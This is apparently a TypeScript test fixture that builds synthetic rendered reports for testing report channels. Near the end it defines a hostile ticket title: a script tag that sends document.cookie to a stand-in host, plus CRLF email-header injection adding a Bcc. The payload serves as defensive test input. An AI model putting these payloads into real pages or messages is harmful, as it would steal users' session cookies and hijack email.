import { SECTION_ORDER, type SectionKey } from '@compass/analysis';
import type { RenderedReport, RenderedSection } from '@compass/renderers';

/**
 * A rendered report, constructed rather than generated.
 *
 * The channels under test are pure functions of a `RenderedReport`, so these tests build one
 * directly instead of running the analysis core. That keeps them about *this* layer: whether
 * every section reaches the body, whether a hostile ticket title stays literal text, whether a
 * long section is split rather than trimmed.
 */

export const RENDERER_ID = 'template' as const;

export function section(key: SectionKey, index: number, overrides: Partial<RenderedSection> = {}): RenderedSection {
  const numeral = String(index).padStart(2, '0');
  const title = key.charAt(0).toUpperCase() + key.slice(1);
  const lead = overrides.lead ?? `The ${key} lead sentence.`;
  const claims = overrides.claims ?? [{ stableId: `${key}:1`, prose: `A claim about ${key}.` }];
  const trailer = overrides.trailer ?? null;

  return {
    key,
    index,
    numeral,
    title,
    lead,
    claims,
    trailer,
    prose:
      overrides.prose ??
      [lead, ...claims.map((claim) => claim.prose), ...(trailer === null ? [] : [trailer])].join('\n\n'),
  };
}

export function renderedReport(overrides: Partial<RenderedReport> = {}): RenderedReport {
  const sections = overrides.sections ?? SECTION_ORDER.map((key, position) => section(key, position + 1));

  return {
    rendererId: RENDERER_ID as RenderedReport['rendererId'],
    masthead: overrides.masthead ?? 'Compass — platform — 2026-08-03',
    freshness: overrides.freshness ?? 'Every source answered for the window.',
    sections,
    prose: overrides.prose ?? sections.map((entry) => entry.prose).join('\n\n'),
    text:
      overrides.text ??
      sections.map((entry) => `${entry.numeral} ${entry.title.toUpperCase()}\n\n${entry.prose}`).join('\n\n'),
  };
}

/**
 * The two payloads the acceptance criteria name, in one ticket title.
 *
 * A script tag *and* a header-injection attempt, because they are defeated by different
 * mechanisms and a test that used only one would leave the other unproven: the tag is neutralised
 * by the prose allowlist never emitting caller-supplied markup, and the CRLF by
 * `collapseWhitespace` folding newlines out of every header value.
 */
export const HOSTILE_TITLE =
  '<script>fetch("//evil.test/"+document.cookie)</script>\r\nBcc: attacker@evil.test\r\nSubject: Hijacked';

export const HOSTILE_CLAIM = `\`DEV-9\` is titled ${HOSTILE_TITLE} and has not moved for 4 working days.`;
